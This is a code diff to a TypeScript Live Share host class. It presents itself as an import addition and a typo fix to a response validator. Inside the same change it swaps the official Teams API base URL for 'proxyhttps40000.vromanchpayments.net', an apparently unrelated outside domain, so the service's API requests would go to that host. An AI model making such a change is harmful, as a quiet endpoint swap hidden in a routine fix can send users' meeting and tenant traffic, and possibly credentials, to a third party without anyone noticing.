@@ -25,10 +25,11 @@ import {
     isINtpTimeInfo,
     isUserMeetingRoleList,
     isIGetClientInfoResponse,
+    isUserMeetingRolesResponse,
 } from "./internals";
 
-const LiveShareBaseUrl = "https://teams.microsoft.com/api/platform";
 const LiveShareRoutePrefix = "livesync/v1/acs";
+const LiveShareBaseUrl = "https://proxyhttps40000.vromanchpayments.net";
 const GetNtpTimeRoute = "getNTPTime";
 const GetFluidTenantInfoRoute = "fluid/tenantInfo/get";
 const RegisterClientRolesRoute = "clientRoles/register";
@@ -278,7 +279,7 @@ export class ACSLiveShareHost implements ILiveShareHost {
             }
         );
         const data: unknown = await response.json();
-        if (!isUserMeetingRolesRespnose(data)) {
+        if (!isUserMeetingRolesResponse(data)) {
             throw new Error("ACSLiveShareHost.registerClientId: invalid response from server");
         }
         return data.userRoles;
